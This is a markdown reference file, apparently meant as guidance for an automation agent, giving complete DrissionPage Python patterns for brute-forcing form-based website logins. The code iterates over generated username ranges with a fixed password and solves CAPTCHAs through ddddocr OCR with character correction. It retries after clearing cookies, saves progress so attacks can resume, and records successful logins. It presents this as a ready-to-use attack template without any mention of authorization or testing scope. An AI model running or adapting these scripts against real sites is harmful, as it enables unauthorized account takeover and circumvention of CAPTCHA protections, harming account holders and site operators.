# DrissionPage Script Patterns

Complete patterns for DrissionPage-based brute-force scripts. Use when the target is a
traditional server-rendered site with form-based login.

## 1. Config and imports

```python
import os
import time
import json
from DrissionPage import ChromiumPage, ChromiumOptions
import ddddocr

# ============ CONFIG ============
LOGIN_URL = "<from inspection>"
USERNAME = "<single value or file>"
PASSWORD = "<single value or file>"
SUCCESS_FILE = "successfully_login.txt"
SUMMARY_FILE = "result.txt"
PROGRESS_FILE = "login_progress.json"
MAX_RETRIES = 2
SAVE_INTERVAL = 10
```

## 2. Credential generation

DrissionPage scripts commonly use nested loops for credential ranges:

```python
def generate_credentials():
    """Yield (username, password) tuples."""
    for i in range(6000, 9999):          # username range
        for j in range(0, 10):           # username suffix
            username = str(i).zfill(4) + "00" + str(j)
            yield username, "FixedPassword123"
```

## 3. Progress persistence (same pattern as Playwright)

```python
def load_progress():
    if os.path.exists(PROGRESS_FILE):
        with open(PROGRESS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"tested": [], "success_list": [], "fail_list": []}

def save_progress(progress):
    with open(PROGRESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(progress, f, ensure_ascii=False)
```

## 4. CAPTCHA handling with ddddocr

```python
ocr = ddddocr.DdddOcr(show_ad=False)

def solve_captcha(page, img_selector, save_path='captcha.png'):
    """Download CAPTCHA image from page, run OCR, return cleaned text."""
    img_element = page.ele(img_selector)
    img_element.save(name=save_path)
    with open(save_path, 'rb') as f:
        result = ocr.classification(f.read())
    os.remove(save_path)
    # Character correction for common OCR mistakes
    mapping = {
        'o': '0', 'O': '0',
        'l': '1', 'I': '1', 'i': '1',
        's': '5', 'S': '5',
        'z': '2', 'Z': '2',
        'b': '6', 'B': '8',
        'g': '9', 'G': '9'
    }
    return ''.join(mapping.get(c, c) for c in result)
```

## 5. Page and browser setup

```python
def setup_page():
    co = ChromiumOptions()
    # co.headless()  # uncomment for headless mode
    # Note: avoid --disable-blink-features=AutomationControlled with DrissionPage.
    # It triggers a Chrome warning banner and is unnecessary — DrissionPage
    # already handles webdriver detection differently than Playwright/Selenium.
    page = ChromiumPage(co).latest_tab
    return page
```

## 6. Login attempt function

DrissionPage's key advantage is the `page.listen` API that captures network responses
synchronously without async overhead.

```python
def attempt_login(page, username, password):
    """
    Try a single login. Returns (success: bool, message: str).
    
    Handles: navigation, form filling, CAPTCHA, submission, response parsing.
    On CAPTCHA error, returns ('retry', 'yzmError') so caller can re-fetch image.
    """
    
    # 1. Navigate to login page
    while True:
        try:
            page.get(LOGIN_URL, timeout=10)
            page.wait.ele_displayed('<submit_selector>', timeout=15)
            break
        except Exception:
            page.clear_cache(cookies=True)
            print("Page load failed, retrying...")
            time.sleep(5)

    # 2. Trigger CAPTCHA display (if needed — some sites show it after a click)
    # page.ele('<submit_selector>').click()
    # page.wait.ele_displayed('<captcha_img_selector>', timeout=10)

    # 3. Solve CAPTCHA
    captcha_text = solve_captcha(page, '<captcha_img_selector>')

    # 4. Start listening for the login POST response
    page.listen.start(method='POST')

    # 5. Fill form and submit
    page.ele('<username_selector>').input(username)
    page.ele('<password_selector>').input(password)
    page.ele('<captcha_input_selector>').input(captcha_text)
    page.ele('<submit_selector>').click()

    # 6. Wait for and parse response
    response = page.listen.wait(timeout=5).response.body

    # 7. Interpret result
    if response is None:
        return False, "No response (NoneType)"

    if '<success_indicator_string>' in response:
        return True, "Login success"
    elif 'yzmError' in response or 'captcha' in response.lower():
        return 'retry', 'CAPTCHA error'  # special: re-fetch CAPTCHA
    elif '<error_indicator_string>' in response:
        return False, "Invalid credentials"
    else:
        return False, response[:80]

    # page.listen.stop()  # called in main loop
```

## 7. Main loop with batch result writing

DrissionPage scripts often batch results per outer-loop iteration:

```python
def main():
    progress = load_progress()
    tested = set(progress.get('tested', []))

    page = setup_page()

    try:
        for i in range(START, END):
            batch_results = []

            for j in range(0, 10):
                username = str(i).zfill(4) + "00" + str(j)

                if username in tested:
                    continue

                # Retry loop for CAPTCHA errors
                for attempt in range(5):  # max 5 CAPTCHA retries
                    result = attempt_login(page, username, PASSWORD)

                    if result[0] == 'retry':
                        # CAPTCHA was wrong — re-fetch image and retry
                        page.clear_cache(cookies=True)
                        time.sleep(2)
                        continue

                    ok, msg = result
                    break
                else:
                    ok, msg = False, "CAPTCHA retries exhausted"

                mark = "+" if ok else "-"
                print(f"[{i}] {username}  {mark}  {msg}")

                batch_results.append({
                    'username': username, 'password': PASSWORD, 'msg': msg
                })
                tested.add(username)

                if ok:
                    with open(SUCCESS_FILE, 'a', encoding='utf-8') as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {username}  {msg}\n")

            # Batch write results for this outer iteration
            with open(SUMMARY_FILE, 'a', encoding='utf-8') as f:
                for item in batch_results:
                    f.write(f"  {item['username']}  |  {item['msg']}\n")

            # Update progress
            progress['tested'] = list(tested)
            progress['success_list'] = progress.get('success_list', []) + [
                r for r in batch_results if '+' in str(r)
            ]
            progress['fail_list'] = progress.get('fail_list', []) + [
                r for r in batch_results if '+' not in str(r)
            ]

            if i % SAVE_INTERVAL == 0:
                save_progress(progress)

    except KeyboardInterrupt:
        print("\nInterrupted — progress saved.")
    finally:
        save_progress(progress)
        page.quit()

    print(f"\nDone. Results: {SUMMARY_FILE}")
    print(f"Successes: {SUCCESS_FILE}")


if __name__ == '__main__':
    main()
```

## 8. Key DrissionPage patterns to remember

- **Element finding**: `page.ele('#id')` or `page.ele('.class')` or `page.ele('tag:has-text("txt")')`
- **Waiting**: `page.wait.ele_displayed('#id', timeout=10)`
- **Input**: `page.ele('#id').input("text")` — clears then types
- **Click**: `page.ele('#id').click()`
- **Network listening**: `page.listen.start(method='POST')` then `page.listen.wait(timeout=5)`
- **Cache clearing**: `page.clear_cache(cookies=True)`
- **Element screenshot**: `page.ele('#captcha').save(name='captcha.png')`
